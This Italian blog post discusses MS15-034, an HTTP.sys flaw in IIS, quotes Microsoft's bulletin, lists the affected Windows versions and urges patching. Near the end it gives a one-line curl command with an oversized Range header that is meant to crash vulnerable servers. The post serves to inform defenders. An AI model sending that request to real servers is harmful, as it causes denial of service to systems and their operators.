---
layout: post
title: "MS15-034: IIS denial of service con una sola richiesta HTTP"
promotion: "MS15-034: IIS denial of service con una sola richiesta HTTP"
modified: 
featured: true
category: [Under attack]
tags: [iis, patching tuesday, denial of service, http, exploit, ms15-034, cve-2015-1635]
image:
  feature: broken-heart.jpg
  credit: David Goehring
  creditlink: https://flic.kr/p/cKgfT
comments: true
share: true
---

[L'altro ieri](https://technet.microsoft.com/library/security/ms15-apr) era il
martedì delle patch di security in Microsoft e come ogni mese sono usciti
bollettini di sicurezza che vanno dal catastrofico al moderatamente grave.

Tra le issue che Microsoft ha marcato come **critiche**, quindi per le quali
decidere di non patchare è una scelta che deve essere ponderata almeno 100
volte, una sola colpisce, sia per effetti che per la semplicità di exploit.
Parliamo della
[MS15-034](https://technet.microsoft.com/library/security/MS15-034).

Cito le parole del bollettino:

> A remote code execution vulnerability exists in the HTTP protocol stack
> (HTTP.sys) that is caused when HTTP.sys improperly parses specially crafted
> HTTP requests. An attacker who successfully exploited this vulnerability
> could execute arbitrary code in the context of the System account.
>
> To exploit this vulnerability, an attacker would have to send a specially
> crafted HTTP request to the affected system. The update addresses the
> vulnerability by modifying how the Windows HTTP stack handles requests.

Stiamo probabilmente parlando di un buffer overflow, trattandosi di un problema
di esecuzione di codice arbitrario, nella gestione del campo ```Range``` della
richiesta HTTP.

I sistemi impattati sono:

* Windows 7
* Windows 8
* Windows 8.1
* Windows 2008 R2
* Windows 2012
* Windows 2012 R2

Anche se ridondante può essere utile specificare che IIS deve essere in
esecuzione sulla macchina affinché l'attacco possa funzionare e che stia
lavorando come web server, essendo HTTP.sys l'indiziato questa volta.

La [MS15-034](https://technet.microsoft.com/library/security/MS15-034) potrebbe
diventare la
[Heartbleed](http://{{site.url}}/blog/heartbleed-parte-1-la-chiacchiera-da-pub/)
di quest'anno visto che una singola richiesta HTTP può mandare in Blue Screen
of Death un server esposto su Internet e _qualche_ server Windows là fuori lo
si trova di sicuro.

Per sfruttare questa vulnerabilità basta un ```telnet``` o il comando
```curl```, non serve neanche impegnarsi troppo questa volta.

{%highlight sh%}
$ curl -v http://sito_web_vulnerabile/ -H "Host: metti_qui_quello_che_vuoi" -H "Range: bytes=0-18446744073709551615"
{%endhighlight%}

## Off by one

Bhé questa non ci sono molte parole da spendere. Le patch di security vanno
installate, anche a costo di rimettere mano a codice custom che improvvisamente
smette di funzionare. Il rischio che una singola richiesta HTTP possa buttare
giù il tuo server è troppo elevato per giustificare l'effort di qualche test di
regressione.

Buon patching.
Enjoy it!

